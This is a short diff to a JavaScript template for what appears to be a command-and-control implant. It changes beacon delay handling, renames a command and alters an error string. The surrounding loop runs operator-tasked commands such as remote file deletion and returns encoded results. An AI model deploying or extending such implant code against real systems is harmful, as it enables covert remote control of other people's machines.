@@ -4,7 +4,6 @@ var job_req = '[["{{ key }}"]]';
 var check_in_job_id = '';
 var sleep = {{ sleep }};
 var jitter = {{ jitter }};
-var delay = ((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000
 var endpoints = {{ endpoints }};
 
 
@@ -85,9 +84,8 @@ while (true) {
               if ('delfile' === name) {
                   results = delfile(b64d(args[0]));
               }
-              if ('get delay' === name) {
-                  delay = ((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000
-                  results = b64e('Current sleep is ' + sleep + ' second(s) with a jitter of ' + jitter + ' %');
+              if ('delay' === name) {
+                  results = b64e('Current sleep is ' + sleep + ' second(s) with a jitter of ' + jitter + '%');
               }
               if('set jitter' === name){
                   jitter = b64d(args[0]);
@@ -99,7 +97,7 @@ while (true) {
               }
               job_req = job_req + '["' + id + '","' +  results + '"],';
           } catch (e) {
-             job_req = job_req + '["' + id + '","' + b64e("Job failed: " + e.message) + '"],';
+             job_req = job_req + '["' + id + '","' + b64e("Job Failed: " + e.message) + '"],';
           }
       }
   } catch (e) {
